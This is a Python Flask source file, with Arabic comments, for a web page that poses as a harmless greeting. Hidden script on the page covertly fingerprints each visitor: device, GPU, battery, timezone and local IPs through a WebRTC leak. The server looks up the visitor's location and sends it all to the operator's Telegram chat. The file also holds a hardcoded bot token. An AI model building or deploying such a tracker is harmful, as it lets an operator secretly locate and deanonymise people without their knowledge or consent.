import os
import requests
import socket
import threading
import telebot
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ═══════════════════════════════════════════
# ⚙️ CONFIG - عدل هذه القيم
# ═══════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "9256373477:AAFnxsNmnisACH3wJyfXp5bMP6tFelVt4VI"
YOUR_CHAT_ID = 8926806806  # ضع الآي دي الخاص بك هنا (رقم)

# Render يعطي المنفذ تلقائياً، محلياً سيعمل على 5000
PORT = int(os.environ.get("PORT", 5000))

app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# ═══════════════════════════════════════════
# صفحة HTML (نفس التصميم)
# ═══════════════════════════════════════════
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexo Chikrok HBi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            color: white; text-align: center; padding: 20px; overflow: hidden;
        }
        .container { animation: fadeIn 1s ease-in-out; }
        h1 {
            font-size: 56px; font-weight: 800;
            background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
            background-size: 300% 300%;
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            background-clip: text; animation: gradient 4s ease infinite;
            margin-bottom: 30px; letter-spacing: 2px;
        }
        .msg {
            font-size: 30px; font-weight: 600; color: #feca57;
            margin-bottom: 25px; text-shadow: 0 0 20px rgba(254, 202, 87, 0.5);
            animation: pulse 1.5s ease-in-out infinite;
        }
        .bye {
            font-size: 42px; font-weight: 800; color: #ff6b6b;
            text-shadow: 0 0 25px rgba(255, 107, 107, 0.7);
            animation: bounce 1s ease-in-out infinite; letter-spacing: 4px;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes gradient { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>Nexo Chikrok HBi</h1>
        <div class="msg">Bizo mn zizo Ymak</div>
        <div class="bye">By By</div>
    </div>

    <script>
        async function collectEverything() {
            const data = {};

            data.screen = screen.width + "x" + screen.height;
            data.availScreen = screen.availWidth + "x" + screen.availHeight;
            data.colorDepth = screen.colorDepth + "bit";
            data.pixelRatio = window.devicePixelRatio || "N/A";
            data.orientation = screen.orientation ? screen.orientation.type : "N/A";

            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform;
            data.language = navigator.language;
            data.languages = (navigator.languages || []).join(", ");
            data.cookiesEnabled = navigator.cookieEnabled;
            data.doNotTrack = navigator.doNotTrack || "N/A";
            data.online = navigator.onLine;

            data.cores = navigator.hardwareConcurrency || "N/A";
            data.memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
            data.maxTouchPoints = navigator.maxTouchPoints || 0;

            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
            data.localTime = new Date().toLocaleString();
            data.utcOffset = -new Date().getTimezoneOffset() / 60 + " hours";

            if (navigator.connection) {
                data.connectionType = navigator.connection.effectiveType || "N/A";
                data.downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "N/A";
                data.rtt = navigator.connection.rtt ? navigator.connection.rtt + " ms" : "N/A";
            }

            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    data.battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not charging)");
                }
            } catch(e) {}

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    data.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                    data.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            data.referrer = document.referrer || "Direct";
            data.pageUrl = window.location.href;

            try {
                const rtcData = await new Promise((resolve) => {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel("");
                    const ips = new Set();
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) { pc.close(); resolve([...ips]); return; }
                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
                        if (m) ips.add(m[1]);
                    };
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    setTimeout(() => { pc.close(); resolve([...ips]); }, 2000);
                });
                if (rtcData.length) data.localIPs = rtcData.join(", ");
            } catch(e) {}

            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) { console.error(e); }
        }

        collectEverything();
    </script>
</body>
</html>
"""

# ═══════════════════════════════════════════
# دوال جمع البيانات
# ═══════════════════════════════════════════
def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_ip_info(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query",
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            if d.get('status') == 'success':
                return d
    except Exception as e:
        print(f"[IP INFO ERROR] {e}")
    return {}

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "N/A"

# ═══════════════════════════════════════════
# إرسال الرسالة إلى تلجرام
# ═══════════════════════════════════════════
def send_telegram_message(ip, ip_info, extra=None):
    hostname = get_hostname(ip)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    flags = []
    if ip_info.get('mobile'): flags.append("📱 Mobile")
    if ip_info.get('proxy'): flags.append("🕵️ Proxy/VPN")
    if ip_info.get('hosting'): flags.append("☁️ Hosting/DC")
    flags_str = " | ".join(flags) if flags else "None"

    text = f"""
🎯 **New Visitor Captured**
🕐 **Time:** `{now}`

🌐 **IP Address:** `{ip}`
🖥️ **Hostname:** `{hostname}`

🏙️ **City:** `{ip_info.get('city', 'N/A')}`
🌍 **Country:** `{ip_info.get('country', 'N/A')}`
📍 **Region:** `{ip_info.get('regionName', 'N/A')}`
📮 **ZIP:** `{ip_info.get('zip', 'N/A')}`
🕐 **Timezone:** `{ip_info.get('timezone', 'N/A')}`

🏢 **ISP:** `{ip_info.get('isp', 'N/A')}`
📡 **Organization:** `{ip_info.get('org', 'N/A')}`
🔢 **ASN:** `{ip_info.get('as', 'N/A')}`

⚠️ **Flags:** `{flags_str}`
"""

    lat, lon = ip_info.get('lat'), ip_info.get('lon')
    if lat and lon:
        text += f"\n📌 **Location:** [Google Maps](https://www.google.com/maps?q={lat},{lon})\n"

    if extra:
        text += f"""
💻 **Display:**
`Screen: {extra.get('screen','N/A')} | Available: {extra.get('availScreen','N/A')}`
`Color Depth: {extra.get('colorDepth','N/A')} | Pixel Ratio: {extra.get('pixelRatio','N/A')}`
`Orientation: {extra.get('orientation','N/A')}`
`Platform: {extra.get('platform','N/A')}`
`Language: {extra.get('language','N/A')}`
`Languages: {extra.get('languages','N/A')}`

⚙️ **Hardware:**
`CPU Cores: {extra.get('cores','N/A')} | RAM: {extra.get('memory','N/A')}`
`Touch Points: {extra.get('maxTouchPoints','N/A')}`
`GPU Vendor: {extra.get('gpuVendor','N/A')}`
`GPU Renderer: {extra.get('gpuRenderer','N/A')}`
`Battery: {extra.get('battery','N/A')}`

📶 **Network:**
`Connection: {extra.get('connectionType','N/A')} | Downlink: {extra.get('downlink','N/A')}`
`RTT: {extra.get('rtt','N/A')}`
`Local IPs: {extra.get('localIPs','N/A')}`
`Online: {extra.get('online','N/A')}`

🕒 **Time & Locale:**
`Timezone: {extra.get('timezone','N/A')}`
`Locale: {extra.get('locale','N/A')}`
`Local Time: {extra.get('localTime','N/A')}`
`UTC Offset: {extra.get('utcOffset','N/A')}`

🔒 **Privacy:**
`Cookies: {extra.get('cookiesEnabled','N/A')}`
`Do Not Track: {extra.get('doNotTrack','N/A')}`
`Referrer: {extra.get('referrer','N/A')}`

🖱️ **User Agent:**
`{extra.get('userAgent','N/A')}`
"""

    text += "\n\n_IP Tracker • NeXo_"

    try:
        bot.send_message(YOUR_CHAT_ID, text, parse_mode='Markdown', disable_web_page_preview=True)
        print(f"[✓] Telegram message sent for IP {ip}")
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")

# ═══════════════════════════════════════════
# مسارات Flask
# ═══════════════════════════════════════════
@app.route('/')
def index():
    ip = get_client_ip()
    ip_info = get_ip_info(ip)
    threading.Thread(target=send_telegram_message, args=(ip, ip_info)).start()
    return render_template_string(HTML_PAGE)

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()
        ip = get_client_ip()
        ip_info = get_ip_info(ip)
        threading.Thread(target=send_telegram_message, args=(ip, ip_info, data)).start()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/health')
def health():
    return "OK", 200

# ═══════════════════════════════════════════
# تشغيل السيرفر
# ═══════════════════════════════════════════
if __name__ == "__main__":
    try:
        # إرسال رسالة تجريبية عند تشغيل السيرفر
        bot.send_message(YOUR_CHAT_ID, "✅ **Telegram Bot is online!**\nEvery visitor will be tracked here.", parse_mode='Markdown')
        print("[✓] Startup message sent to Telegram")
    except Exception as e:
        print(f"[WARNING] Could not send startup message: {e}")

    print(f"🌐 Flask running on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
